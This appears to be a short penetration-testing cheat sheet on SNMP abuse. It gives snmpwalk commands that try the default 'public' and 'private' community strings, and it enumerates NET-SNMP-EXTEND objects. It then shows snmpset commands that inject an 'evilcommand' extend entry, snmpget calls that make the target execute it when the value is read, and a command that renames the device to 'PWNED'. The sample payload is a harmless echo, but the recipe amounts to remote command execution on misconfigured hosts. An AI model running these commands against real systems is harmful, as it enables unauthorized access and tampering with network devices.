---
tags:
  - security
aliases:
  - snmpset
  - snmpget
---
# Check for Default Community Strings
```
snmpwalk -v2c -c public <ip>
```

```
snmpwalk -v2c -c private <ip>
```
# Specific Objects
```
snmpwalk -v2c -c <community> <ip> NET-SNMP-EXTEND-MIB::nsExtendObjects
snmpwalk -v2c -c <community> <ip> NET-SNMP-EXTEND-MIB::nsExtendOutput1Table
```
# Adding Commands
```
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c <community> <ip> \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendAgs."evilcommand"' = 'hello world'
```
# Running Injected Command
SNMP commands are run on read.
```
snmpget -v2c -c <community> <ip> NET-SNMP-EXTEND-MIB::nsExtendOutputFull."id"
snmpget -v2c -c <community> <ip> NET-SNMP-EXTEND-MIB::nsExtendResult."id"
```
# Setting Name
```
snmpset -v2c -c <community> <ip> .1.3.6.1.2.1.1.5.0 s "PWNED"
```